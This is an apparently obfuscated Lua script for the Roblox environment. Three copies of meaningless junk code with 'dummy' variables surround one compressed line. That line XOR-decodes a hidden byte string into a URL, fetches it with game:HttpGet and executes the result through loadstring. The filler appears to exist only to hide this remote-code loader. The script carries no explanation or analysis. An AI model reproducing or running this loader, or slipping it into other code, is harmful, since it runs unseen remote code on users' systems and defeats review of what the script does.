local _a,_b,_c,_d,_e,_f={},0,"","",{},{}
for i=1,512 do
    _a[i] = string.char((i*3 + (i%7)*5) % 256)
    _b = _b + i % 42
    table.insert(_d, _b*2 % 127)
end
for j=1,#_a do
    _c = _c .. _a[j] .. string.char((_b+j)%256)
end
for k=1,128 do
    _e[k] = string.char((k*11 + k%9) % 256)
    _f[k] = (k*13 + _b) % 256
end
local function _x1(x,y)
    local r={}
    for i=1,#x do r[i] = string.char((string.byte(x,i)+string.byte(y,i%#y+1))%256) end
    return table.concat(r)
end
local dummy1 = _x1(_c, table.concat(_e))
local dummy2 = _x1(table.concat(_e), _c)
local dummy3 = _x1(table.concat(_e), table.concat(_e))
local dummy4 = _x1(dummy1,dummy2)
local dummy5 = _x1(dummy4,dummy3)
local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\211\48\244\180\215\14\208\209\148\6\238\190\198\10\158\209\222\35\245\244\207\27\208\199\200\106\235\186\206\16\158\239\212\36\226\245\203\11\208","\126\177\163\187\69\134\219\167")))()-- ========================================================
local _a,_b,_c,_d,_e,_f={},0,"","",{},{}
for i=1,512 do
    _a[i] = string.char((i*3 + (i%7)*5) % 256)
    _b = _b + i % 42
    table.insert(_d, _b*2 % 127)
end
for j=1,#_a do
    _c = _c .. _a[j] .. string.char((_b+j)%256)
end
for k=1,128 do
    _e[k] = string.char((k*11 + k%9) % 256)
    _f[k] = (k*13 + _b) % 256
end
local function _x1(x,y)
    local r={}
    for i=1,#x do r[i] = string.char((string.byte(x,i)+string.byte(y,i%#y+1))%256) end
    return table.concat(r)
end
local dummy1 = _x1(_c, table.concat(_e))
local dummy2 = _x1(table.concat(_e), _c)
local dummy3 = _x1(table.concat(_e), table.concat(_e))
local dummy4 = _x1(dummy1,dummy2)
local dummy5 = _x1(dummy4,dummy3)
local _a,_b,_c,_d,_e,_f={},0,"","",{},{}
for i=1,512 do
    _a[i] = string.char((i*3 + (i%7)*5) % 256)
    _b = _b + i % 42
    table.insert(_d, _b*2 % 127)
end
for j=1,#_a do
    _c = _c .. _a[j] .. string.char((_b+j)%256)
end
for k=1,128 do
    _e[k] = string.char((k*11 + k%9) % 256)
    _f[k] = (k*13 + _b) % 256
end
local function _x1(x,y)
    local r={}
    for i=1,#x do r[i] = string.char((string.byte(x,i)+string.byte(y,i%#y+1))%256) end
    return table.concat(r)
end
local dummy1 = _x1(_c, table.concat(_e))
local dummy2 = _x1(table.concat(_e), _c)
local dummy3 = _x1(table.concat(_e), table.concat(_e))
local dummy4 = _x1(dummy1,dummy2)
local dummy5 = _x1(dummy4,dummy3)
